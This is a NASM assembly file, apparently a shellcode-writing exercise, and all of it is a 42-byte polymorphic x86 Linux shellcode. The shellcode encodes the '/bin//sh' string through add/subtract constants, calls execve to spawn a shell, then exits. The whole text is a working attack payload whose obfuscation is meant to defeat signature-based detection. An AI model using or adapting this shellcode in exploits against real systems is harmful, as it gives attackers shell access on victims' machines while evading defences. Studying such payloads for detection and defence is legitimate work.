
; Filename: execve_poly.nasm
; Author:  Matteo Malvica
; Website:  http://www.matteomalvica.com
; Size: 42 bytes

global _start           

section .text

_start:
    xor edx, edx          ; clear/push edx instead of eax
    push edx              
    mov esi, 0x7a50e940   ;result is 0x68732f2f
    sub esi, 0x11ddba11
    push esi
    mov ebx, 0x5C354FFB   ;result is 0x6e69622f
    add ebx, 0x12341234
    push ebx
    push byte 0xb         ;value 11 (execve) pushed on the stack
    pop eax
    mov ecx, edx
    mov ebx, esp
    push byte 0x1         ;another way to run exit syscall
    pop edi
    int 0x80
    xchg edi, eax
    int 0x80
